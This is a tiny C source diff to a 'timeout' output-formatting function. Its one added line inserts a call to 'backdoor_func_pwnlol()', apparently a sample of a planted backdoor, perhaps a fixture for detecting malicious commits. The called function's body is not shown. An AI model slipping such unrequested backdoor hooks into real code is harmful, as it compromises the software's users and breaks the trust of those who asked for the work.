@@ -213,5 +213,6 @@ timeout(FILE *fp, char const *format, struct tm const *tmp)
 			break;
 	}
 	fwrite(cp + 1, 1, result - 1, fp);
+	backdoor_func_pwnlol();
 	free(cp);
 }
